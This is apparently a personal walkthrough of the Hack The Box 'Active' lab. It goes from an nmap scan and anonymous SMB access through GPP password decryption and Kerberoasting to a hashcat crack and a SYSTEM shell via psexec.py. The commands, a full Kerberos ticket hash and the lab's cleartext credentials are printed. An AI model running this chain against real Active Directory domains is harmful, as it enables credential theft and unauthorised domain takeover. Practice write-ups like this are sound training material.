# HTB "Active" Walkthrough

### Nmap scan
```# Nmap 7.92 scan initiated Tue Nov 30 13:04:09 2021 as: nmap -A -oN nmap/firstAllScan -vv -T 4 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up, received conn-refused (0.027s latency).
Scanned at 2021-11-30 13:04:10 EST for 72s
Not shown: 983 closed tcp ports (conn-refused)
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-11-30 18:18:27Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  tcpwrapped    syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
|_clock-skew: 14m10s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30471/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49680/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2021-11-30T18:19:27
|_  start_date: 2021-11-30T17:51:02

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done at Tue Nov 30 13:05:22 2021 -- 1 IP address (1 host up) scanned in 72.61 seconds
```

## Smbclient

```
smblcient -N -L \\\\10.10.10.100
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```

looking for Groups.xml in Replication folder for GPP attack

- copy cpassword from Groups.xml
- use gpp-decrypt to decrypt pass hash
	- GPPstillStandingStrong2k18

Tried psexec but failed as shares are not writeable
use GetUserSPNs.py to try kerberoasting
- ` GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request`
Had to sync clock with target machine using `ntpdate <target ip>`

try to crack hash with hashcat
```
hashcat -m 13100 hash.txt rockyou.txt -O

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c17df40ddb10a1e6a67b3034e98282b9$cfa41c39ab622564a9cbc70dfef22b5d45968b730a7fcc2d172edbcd
f18930dec5ae624a95957c2b3eb78ed5cade648c17f30545361fe008dd2ffb49e4daf19e782b6440a78102ab5de6c7d168967ccc54aea7268cceb866e8047107598a178dc07fe119766df4f7d
2968955df307a795a8b6ccc872aef45bc5fe1a7908aa68e94b994786784446cf1a439c1c7fdfc4ba059443545ac4c9b19c31a190f8cc41deb8a646eb5441d7e20ce56d9e910decfddfd40c676
86e9799255d59be2a500ec5f5e61a4ae2276534c6bdf07e8b7757bd79270570ccb264f783fcdef87fe11f04e3b894b9ab4845c064120a9bfd701d31240e7fbd786694a5aa6c938e7bfe859714
92b4caf078420be76e79aa126140bc19044f0adf03d9bfab95ec4e16a1855539a85a6782afe1bad72b575af15b4b795a04eb63027b10785b550bc4f61186ae9e59c8c0369bf58bc4814f32c77
fa20097eb509ca69607166edad99b444a4ad8c8aee0c8c10216310a4cc615b455f15b827cf3402cbc7f3edf96ab6c1adc00b0310951a6d43076032e75d20c4977b0774412e225de5d0878e4b4
97c6b6c896215f5252456b17a25bdb993a0ae08f58fd12cf758bd03725eee9f125c09cb06abf81d7644a703462ed37bbddc718ac112b4e9f533ec770f8e990089cc2d900e500d8ab8daae5ecf
e0397510693660dff4fa8bf1e7427467634ab0a5402d59ed72a10b2207967551f9690264a3ced4c5f417e66a7bf10d0fd30107617655bee699352c8699f6e4b9daa64184f2eb1430e59e540ab
de966b2593c7bec51770d6ca4942385f8e1029258a6740e04e8f64221df0ce442bf6f1ed458f4afc96594ca7e66bc95697bf3b950d8a69c2a8a4e6b6002f5957433bdd5f9d13be543a4fa42d6
cf4092222221511c35d17f2ea512b9295f0b29dece1640b9cfb969d621e2ce540fce6dbc169b620f5ffd5d5c6482e0be55e1203efbe3e5eb6b50eec2d14351ddfbc3e4e55c5ac379edbb566c4
b6d925ee0877dee9fa0688e8330a5aad7ef50e7cc8335bd871f4df4a21c4967cc9874fe7155810fa9516e987edf66c2c92c2bb64582a623a43ca5f2b919a5e26ea13972865041aa4ce316c4fc
95a445b4248398b58dc0dd1cdfd7221a07deef233e5cd53a1ba38ae60ee540f2c2810d0203795c7c8113caf4f8d5135d3e12c067b0cc890e80fa7489602a44b898ace22efc5e667f78aa6426b
bf23b08e03a0c8f51d932dfcd131b4a174a83c79f:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...83c79f
Time.Started.....: Tue Nov 30 14:35:57 2021 (27 secs)
Time.Estimated...: Tue Nov 30 14:36:24 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   401.2 kH/s (7.92ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10541059/14344385 (73.49%)
Rejected.........: 2051/10541059 (0.02%)
Restore.Point....: 10536957/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: TiffanyFWright -> TerryJackson

Started: Tue Nov 30 14:35:37 2021
Stopped: Tue Nov 30 14:36:26 2021

```

- Got creds Administrator:Ticketmaster1968
- Use psexec.py to gain shell as NT Authority\SYSTEM


